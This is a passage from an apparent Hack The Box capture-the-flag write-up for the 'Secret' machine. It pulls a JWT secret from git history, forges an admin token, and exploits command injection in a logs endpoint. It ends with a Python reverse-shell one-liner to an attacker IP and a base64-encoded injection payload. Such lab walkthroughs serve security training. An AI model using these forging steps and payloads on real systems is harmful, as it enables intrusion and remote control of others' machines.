function_">min</span>(<span class="number">6</span>).required()</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Joi</span>.<span class="title function_">validate</span>(data, schema)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// login validation</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">loginValidation</span> = data =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> schema2 = &#123;</span><br><span class="line">        <span class="attr">email</span>: <span class="title class_">Joi</span>.<span class="title function_">string</span>().<span class="title function_">min</span>(<span class="number">6</span>).required().<span class="title function_">email</span>(),</span><br><span class="line">        <span class="attr">password</span>: <span class="title class_">Joi</span>.<span class="title function_">string</span>().<span class="title function_">min</span>(<span class="number">6</span>).required()</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Joi</span>.<span class="title function_">validate</span>(data, schema2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">registerValidation</span> = registerValidation</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">loginValidation</span> = loginValidation</span><br></pre></td></tr></table></figure>

<p>so now we know that what we know how we can register and login as a user.</p>
<p>And we can see that login endpoint creates a JWT token upon loggin in.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">_id</span>: user.<span class="property">id</span>, <span class="attr">name</span>: user.<span class="property">name</span> , <span class="attr">email</span>: user.<span class="property">email</span>&#125;, process.<span class="property">env</span>.<span class="property">TOKEN_SECRET</span> )</span><br><span class="line">res.<span class="title function_">header</span>(<span class="string">&#x27;auth-token&#x27;</span>, token).<span class="title function_">send</span>(token);</span><br></pre></td></tr></table></figure>

<p>and now we know the location where secret is stored so we can just see it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret]</span><br><span class="line">└─<span class="comment"># cat local-web/.env</span></span><br><span class="line">DB_CONNECT = <span class="string">&#x27;mongodb://127.0.0.1:27017/auth-web&#x27;</span></span><br><span class="line">TOKEN_SECRET = secret</span><br></pre></td></tr></table></figure>

<p>but no luck I guess it redacted or used a dummy word but it can we in the previous commits so let’s check in that dump folder.</p>
<h2 id="Git-Dump-Enumeration"><a href="#Git-Dump-Enumeration" class="headerlink" title="Git Dump Enumeration"></a>Git Dump Enumeration</h2><p>Now we have extracted everything from Git repo we can see there is a total of 6 commit.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># ls -la</span></span><br><span class="line">总用量 32</span><br><span class="line">drwxr-xr-x 8 root root 4096 11月  1 09:34 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 11月  1 09:28 ..</span><br><span class="line">drwxr-xr-x 7 root root 4096 11月  1 09:30 0-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78</span><br><span class="line">drwxr-xr-x 7 root root 4096 11月  1 09:31 1-3a367e735ee76569664bf7754eaaade7c735d702</span><br><span class="line">drwxr-xr-x 7 root root 4096 11月  1 09:32 2-de0a46b5107a2f4d26e348303e76d85ae4870934</span><br><span class="line">drwxr-xr-x 7 root root 4096 11月  1 09:33 3-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b</span><br><span class="line">drwxr-xr-x 7 root root 4096 11月  1 09:34 4-55fe756a29268f9b4e786ae468952ca4a8df1bd8</span><br><span class="line">drwxr-xr-x 7 root root 4096 11月  1 09:34 5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb</span><br></pre></td></tr></table></figure>

<p>one thing that we know from above manual enumeration is that it used secret to sign JWT tokens so let’s hunt for it.<br>Looking through all the commit I found token in the following commits.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># cat 0-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78/.env </span></span><br><span class="line">DB_CONNECT = <span class="string">&#x27;mongodb://127.0.0.1:27017/auth-web&#x27;</span></span><br><span class="line">TOKEN_SECRET = secret</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># cat 1-3a367e735ee76569664bf7754eaaade7c735d702/.env</span></span><br><span class="line">DB_CONNECT = <span class="string">&#x27;mongodb://127.0.0.1:27017/auth-web&#x27;</span></span><br><span class="line">TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># cat 2-de0a46b5107a2f4d26e348303e76d85ae4870934/.env </span></span><br><span class="line">DB_CONNECT = <span class="string">&#x27;mongodb://127.0.0.1:27017/auth-web&#x27;</span></span><br><span class="line">TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># cat 3-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b/.env </span></span><br><span class="line">DB_CONNECT = <span class="string">&#x27;mongodb://127.0.0.1:27017/auth-web&#x27;</span></span><br><span class="line">TOKEN_SECRET = secret</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># cat 4-55fe756a29268f9b4e786ae468952ca4a8df1bd8/.env</span></span><br><span class="line">DB_CONNECT = <span class="string">&#x27;mongodb://127.0.0.1:27017/auth-web&#x27;</span></span><br><span class="line">TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># cat 5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/.env </span></span><br><span class="line">DB_CONNECT = <span class="string">&#x27;mongodb://127.0.0.1:27017/auth-web&#x27;</span></span><br><span class="line">TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE</span><br></pre></td></tr></table></figure>

<p>So now we have the secret let’s go into details of how the token is signed.<br>you can check that on &#x2F;routes&#x2F;verifytoken.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="title function_">header</span>(<span class="string">&quot;auth-token&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!token) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="string">&quot;Access Denied&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> verified = jwt.<span class="title function_">verify</span>(token, process.<span class="property">env</span>.<span class="property">TOKEN_SECRET</span>);</span><br><span class="line">        req.<span class="property">user</span> = verified;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid Token&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>let’s just create a sample token using the secret found.</p>
<h2 id="Registering-User"><a href="#Registering-User" class="headerlink" title="Registering User"></a>Registering User</h2><p>So let’s register the user from our above knowledge.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># curl -X POST -H &#x27;Content-Type: application/json&#x27; -v http://secret.htb/api/user/register --data &#x27;&#123;&quot;name&quot;: &quot;oopsie&quot;,&quot;email&quot;: &quot;oopsie@oops.com&quot;,&quot;password&quot;: &quot;oopsie&quot;&#125;&#x27;</span></span><br><span class="line">Note: Unnecessary use of -X or --request, POST is already inferred.</span><br><span class="line">*   Trying 10.10.11.120:80...</span><br><span class="line">* Connected to secret.htb (10.10.11.120) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; POST /api/user/register HTTP/1.1</span><br><span class="line">&gt; Host: secret.htb</span><br><span class="line">&gt; User-Agent: curl/7.74.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Type: application/json</span><br><span class="line">&gt; Content-Length: 66</span><br><span class="line">&gt; </span><br><span class="line">* upload completely sent off: 66 out of 66 bytes</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">&lt; Date: Mon, 01 Nov 2021 13:44:13 GMT</span><br><span class="line">&lt; Content-Type: application/json; charset=utf-8</span><br><span class="line">&lt; Content-Length: 17</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: Express</span><br><span class="line">&lt; ETag: W/<span class="string">&quot;11-MVKplfg5kMeyW9LR080TwknJb0I&quot;</span></span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host secret.htb left intact</span></span><br><span class="line">&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;oopsie&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>We registered a user oopsie.</p>
<p>Now let’s try and login. For login we know we need to send email and password.(from validation.js)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># curl -X POST -H &#x27;Content-Type: application/json&#x27; -v http://secret.htb/api/user/login --data &#x27;&#123;&quot;email&quot;: &quot;oopsie@oops.com&quot;,&quot;password&quot;: &quot;oopsie&quot;&#125;&#x27;</span></span><br><span class="line">Note: Unnecessary use of -X or --request, POST is already inferred.</span><br><span class="line">*   Trying 10.10.11.120:80...</span><br><span class="line">* Connected to secret.htb (10.10.11.120) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; POST /api/user/login HTTP/1.1</span><br><span class="line">&gt; Host: secret.htb</span><br><span class="line">&gt; User-Agent: curl/7.74.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Type: application/json</span><br><span class="line">&gt; Content-Length: 49</span><br><span class="line">&gt; </span><br><span class="line">* upload completely sent off: 49 out of 49 bytes</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">&lt; Date: Mon, 01 Nov 2021 13:44:50 GMT</span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8</span><br><span class="line">&lt; Content-Length: 205</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: Express</span><br><span class="line">&lt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdmZWYyZDg5MzgyMTA0NTlhY2I3NGEiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU3NzQyOTB9.HE0Zmxlx0YF7WRHX3Ju0Hgu0BlKVj7yqzG4hmvTAw3Y</span><br><span class="line">&lt; ETag: W/<span class="string">&quot;cd-qokR8BWKB2cBLuHw0rUC0BtzrYs&quot;</span></span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host secret.htb left intact</span></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdmZWYyZDg5MzgyMTA0NTlhY2I3NGEiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU3NzQyOTB9.HE0Zmxlx0YF7WRHX3Ju0Hgu0BlKVj7yqzG4hmvTAw3Y</span><br></pre></td></tr></table></figure>

<p>looks like we are logged in and we have our token.</p>
<p>now let’s see if we can do something intresting with but let’s first see how it validates a JWT token.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="title function_">header</span>(<span class="string">&quot;auth-token&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!token) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="string">&quot;Access Denied&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> verified = jwt.<span class="title function_">verify</span>(token, process.<span class="property">env</span>.<span class="property">TOKEN_SECRET</span>);</span><br><span class="line">        req.<span class="property">user</span> = verified;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid Token&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>looks like we just have to pass it as header in request with header name auth-token.</p>
<p>so let’s confirm it by sending it to &#x2F;api&#x2F;priv endpoint which just tells you if you are admin or not.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># curl http://secret.htb/api/priv -H &#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdmZWYyZDg5MzgyMTA0NTlhY2I3NGEiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU3NzQyOTB9.HE0Zmxlx0YF7WRHX3Ju0Hgu0BlKVj7yqzG4hmvTAw3Y&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;role&quot;</span>:&#123;<span class="string">&quot;role&quot;</span>:<span class="string">&quot;you are normal user&quot;</span>,<span class="string">&quot;desc&quot;</span>:<span class="string">&quot;oopsie&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Looks like we are not admin but we have the secret we can forge the token.</p>
<p>Let’s Understand what we need to satisfy in order to be an admin it is declared in &#x2F;routes&#x2F;private.js</p>
<p>so it basically checks that if name &#x3D;&#x3D; ‘theadmin’ if so then it will give us the admin capabilities.</p>
<p>Let’s decode our token and find how its made.</p>
<p>I will use jwttool for it you can use any tool of your liking you can also use their online website jwt.io which easy and pretty convinient.</p>
<p>website: <span class="exturl" data-url="aHR0cHM6Ly9qd3QuaW8v">https://jwt.io/<i class="fa fa-external-link-alt"></i></span></p>
<p>tool: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpY2FycGkvand0X3Rvb2w=">https://github.com/ticarpi/jwt_tool<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># python3 /root/jwt_tool-master/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdmZWYyZDg5MzgyMTA0NTlhY2I3NGEiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU3NzQyOTB9.HE0Zmxlx0YF7WRHX3Ju0Hgu0BlKVj7yqzG4hmvTAw3Y</span></span><br><span class="line"></span><br><span class="line">        \   \        \         \          \                    \ </span><br><span class="line">   \__   |   |  \     |\__    __| \__    __|                    |</span><br><span class="line">         |   |   \    |      |          |       \         \     |</span><br><span class="line">         |        \   |      |          |    __  \     __  \    |</span><br><span class="line">  \      |      _     |      |          |   |     |   |     |   |</span><br><span class="line">   |     |     / \    |      |          |   |     |   |     |   |</span><br><span class="line">\        |    /   \   |      |          |\        |\        |   |</span><br><span class="line"> \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|</span><br><span class="line"> Version 2.1.0                \______|             @ticarpi      </span><br><span class="line"></span><br><span class="line">Original JWT: </span><br><span class="line">                                                                                                                                  </span><br><span class="line">=====================</span><br><span class="line">Decoded Token Values:</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">Token header values:</span><br><span class="line">[+] alg = <span class="string">&quot;HS256&quot;</span></span><br><span class="line">[+] typ = <span class="string">&quot;JWT&quot;</span></span><br><span class="line"></span><br><span class="line">Token payload values:</span><br><span class="line">[+] _id = <span class="string">&quot;617fef2d8938210459acb74a&quot;</span></span><br><span class="line">[+] name = <span class="string">&quot;oopsie&quot;</span></span><br><span class="line">[+] email = <span class="string">&quot;oopsie@oops.com&quot;</span></span><br><span class="line">[+] iat = 1635774290    ==&gt; TIMESTAMP = 2021-11-01 09:44:50 (UTC)</span><br><span class="line"></span><br><span class="line">----------------------</span><br><span class="line">JWT common timestamps:</span><br><span class="line">iat = IssuedAt</span><br><span class="line">exp = Expires</span><br><span class="line">nbf = NotBefore</span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure>

<h2 id="Forging-token"><a href="#Forging-token" class="headerlink" title="Forging token"></a>Forging token</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># python3 /root/jwt_tool-master/jwt_tool.py -I -S hs256 -pc &#x27;name&#x27; -pv &#x27;theadmin&#x27; -p &#x27;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#x27; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdmZWYyZDg5MzgyMTA0NTlhY2I3NGEiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU3NzQyOTB9.HE0Zmxlx0YF7WRHX3Ju0Hgu0BlKVj7yqzG4hmvTAw3Y</span></span><br><span class="line"></span><br><span class="line">        \   \        \         \          \                    \ </span><br><span class="line">   \__   |   |  \     |\__    __| \__    __|                    |</span><br><span class="line">         |   |   \    |      |          |       \         \     |</span><br><span class="line">         |        \   |      |          |    __  \     __  \    |</span><br><span class="line">  \      |      _     |      |          |   |     |   |     |   |</span><br><span class="line">   |     |     / \    |      |          |   |     |   |     |   |</span><br><span class="line">\        |    /   \   |      |          |\        |\        |   |</span><br><span class="line"> \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|</span><br><span class="line"> Version 2.1.0                \______|             @ticarpi      </span><br><span class="line"></span><br><span class="line">Original JWT: </span><br><span class="line"></span><br><span class="line">jwttool_84f445163ec6ec4a952b95f091f746f1 - Tampered token - HMAC Signing:</span><br><span class="line">[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdmZWYyZDg5MzgyMTA0NTlhY2I3NGEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTc3NDI5MH0.-R0fMlWc1aeH9qhFtd2kwcp26ykHDtRBKLmhdduILAY</span><br></pre></td></tr></table></figure>

<p>Now we have the forged token let’s verify it at &#x2F;api&#x2F;priv endpoint</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># curl http://secret.htb/api/priv -H &#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdmZWYyZDg5MzgyMTA0NTlhY2I3NGEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTc3NDI5MH0.-R0fMlWc1aeH9qhFtd2kwcp26ykHDtRBKLmhdduILAY&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;creds&quot;</span>:&#123;<span class="string">&quot;role&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;theadmin&quot;</span>,<span class="string">&quot;desc&quot;</span>:<span class="string">&quot;welcome back admin&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Now we are admin.</p>
<p>Now let’s try to look at logs as we can see it in &#x2F;routes&#x2F;private.js</p>
<p>We have to specify the file name as the get parameter with the name file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># curl &#x27;http://secret.htb/api/logs?file=/etc/passwd&#x27; -H &#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdmZWYyZDg5MzgyMTA0NTlhY2I3NGEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTc3NDI5MH0.-R0fMlWc1aeH9qhFtd2kwcp26ykHDtRBKLmhdduILAY&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;killed&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;code&quot;</span>:128,<span class="string">&quot;signal&quot;</span>:null,<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;git log --oneline /etc/passwd&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Looks like it’s a comand injection.</p>
<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret/dump]</span><br><span class="line">└─<span class="comment"># curl &#x27;http://secret.htb/api/logs?file=;id&#x27; -H &#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdmZWYyZDg5MzgyMTA0NTlhY2I3NGEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTc3NDI5MH0.-R0fMlWc1aeH9qhFtd2kwcp26ykHDtRBKLmhdduILAY&#x27;</span></span><br><span class="line"><span class="string">&quot;80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n&quot;</span></span><br></pre></td></tr></table></figure>

<p>Yeah so now let’s to get the rev shell.</p>
<p>from: revshells.com</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;10.10.14.20&quot;,443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>base64 + url encoded final payload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="built_in">echo</span>+cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMjAiLDQ0MykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigic2giKSc=+|+<span class="built_in">base64</span>+-d|+bash</span><br></pre></td></tr></table></figure>


